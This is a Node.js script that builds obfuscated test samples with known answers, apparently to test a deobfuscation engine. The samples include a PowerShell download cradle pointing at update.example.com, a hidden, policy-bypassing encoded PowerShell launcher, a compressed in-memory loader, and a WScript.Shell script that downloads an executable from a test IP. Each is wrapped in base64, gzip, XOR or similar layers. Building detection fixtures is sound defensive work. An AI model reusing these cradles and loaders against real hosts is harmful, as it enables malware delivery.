/**
 * Builds obfuscated test samples with KNOWN answers, using only Node's own
 * libraries (not CyberChef), so the test is independent of the engine.
 * All "malicious" content is inert: example.com domains and RFC 5737 test IPs.
 */
import fs from "node:fs";
import zlib from "node:zlib";
import path from "node:path";
import { fileURLToPath } from "node:url";

const dir = path.join(path.dirname(fileURLToPath(import.meta.url)), "samples");
fs.mkdirSync(dir, { recursive: true });

const b64 = b => Buffer.from(b).toString("base64");
const hex = b => Buffer.from(b).toString("hex");
const xor = (b, key) => Buffer.from(Buffer.from(b).map((x, i) => x ^ key[i % key.length]));
const rev = s => [...s].reverse().join("");
const rot13 = s => s.replace(/[a-z]/gi, c => { const o = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - o + 13) % 26 + o); });

const cradle = "IEX (New-Object Net.WebClient).DownloadString('http://update.example.com/stage2.ps1')";
const prose = "The quick brown fox jumps over the lazy dog. Connect to the server at 192.0.2.44 and download the payload.";

// a fake (inert) PE: valid MZ/PE headers + DOS stub text, no code
function fakePE() {
    const b = Buffer.alloc(512, 0);
    b.write("MZ", 0, "latin1");
    b[2] = 0x90; b[4] = 3; b[8] = 4; b[12] = 0xff; b[13] = 0xff; b[16] = 0xb8; b[24] = 0x40;
    b.writeUInt32LE(0x80, 0x3c);
    b.write("This program cannot be run in DOS mode.\r\r\n$", 0x4e, "latin1");
    b.write("PE\0\0", 0x80, "latin1");
    return b;
}

const samples = [
    { name: "01-base64.txt", data: b64(prose), expect: "quick brown fox", depth: 1 },
    { name: "02-hex.txt", data: hex(prose), expect: "quick brown fox", depth: 1 },
    { name: "03-base64-gzip.txt", data: b64(zlib.gzipSync(cradle)), expect: "DownloadString", depth: 2 },
    { name: "04-powershell-encodedcommand.txt", data: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc ${b64(Buffer.from(cradle, "utf16le"))}`, expect: "DownloadString", depth: 3 },
    { name: "05-powershell-deflatestream.ps1", data: `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("${b64(zlib.deflateRawSync(cradle))}"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();`, expect: "DownloadString", depth: 3 },
    { name: "06-xor-single-byte-base64.txt", data: b64(xor(prose, [0x5a])), expect: "quick brown fox", depth: 2 },
    { name: "07-xor-multibyte-pe-hex.txt", data: hex(xor(fakePE(), Buffer.from("s3cr3t"))), expect: "PE", depth: 2, expectFile: true },
    { name: "08-reversed-base64.txt", data: rev(b64(cradle)), expect: "DownloadString", depth: 2 },
    { name: "09-rot13.txt", data: rot13(prose), expect: "quick brown fox", depth: 1 },
    { name: "10-decimal-charcodes.txt", data: [...Buffer.from(cradle)].join(","), expect: "DownloadString", depth: 1 },
    { name: "11-url-encoded-js.txt", data: encodeURIComponent(`var x = new ActiveXObject("WScript.Shell"); x.Run("powershell -c iwr http://198.51.100.7/a.exe -OutFile a.exe");`).replace(/[a-z]/gi, c => "%" + c.charCodeAt(0).toString(16)), expect: "WScript.Shell", depth: 1 },
    { name: "12-base32.txt", data: base32(prose), expect: "quick brown fox", depth: 1 },
    { name: "13-layered-b64-hex-rot13.txt", data: b64(hex(rot13(prose))), expect: "quick brown fox", depth: 3 },
    { name: "14-powershell-char-codes.ps1", data: "IEX(" + [...cradle].map(c => `[char]${c.charCodeAt(0)}`).join("+") + ")", expect: "DownloadString", depth: 2 },
    { name: "15-five-layers.txt", data: b64(hex(rev(b64(zlib.gzipSync(cradle))))), expect: "DownloadString", depth: 5 },
    { name: "16-jwt.txt", data: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", expect: "John Doe", depth: 1 },
    { name: "17-binary-xor-pe.bin", data: xor(fakePE(), [0x41]), expect: "PE", depth: 1, expectFile: true, binary: true },
    { name: "18-js-unicode-escapes.js", data: "eval(\"" + [...`document.location="http://update.example.com/x"`].map(c => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0")).join("") + "\")", expect: "document.location", depth: 1 },
];

function base32(s) {
    const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    const bytes = Buffer.from(s);
    let bits = "", out = "";
    for (const b of bytes) bits += b.toString(2).padStart(8, "0");
    for (let i = 0; i < bits.length; i += 5) out += A[parseInt(bits.slice(i, i + 5).padEnd(5, "0"), 2)];
    while (out.length % 8) out += "=";
    return out;
}

const manifest = [];
for (const s of samples) {
    fs.writeFileSync(path.join(dir, s.name), s.data);
    manifest.push({ file: s.name, expect: s.expect, expectFile: !!s.expectFile, layers: s.depth });
}
fs.writeFileSync(path.join(dir, "manifest.json"), JSON.stringify(manifest, null, 2));
console.log(`Wrote ${samples.length} samples to ${dir}`);
